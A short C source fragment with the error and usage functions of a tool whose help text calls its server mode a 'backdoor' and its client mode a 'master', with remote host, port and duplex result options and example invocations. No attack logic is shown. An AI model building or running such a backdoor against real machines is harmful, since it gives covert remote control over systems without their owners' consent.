#include <stdio.h>
#include <stdlib.h>

void error(const char *err)
{
	fprintf(stderr, "%s\n", err);
	exit(1);
}

void usage(char *name)
{
  printf("Usage: [options] [remote host]%s\n", name);
  printf(" -c Use client mode: Act as master.\n");
  printf(" -s Use server mode: Act as backdoor. [default]\n");
	printf(" -i <arg> Remote host address for client mode. [default=127.0.0.1]\n");
	printf(" -p <arg> Remote port for client mode. [default=9001]\n");
	printf(" -d Use duplex mode: Send/get results remotely.\n");
	printf(" -h Show this help listing.\n");
  printf(" EXAMPLES:\t %s -c -i 192.168.0.1 -p 80 -d\n", name);
  printf(" EXAMPLES:\t %s -s -d udp port 80\n", name);

  exit(0);
}

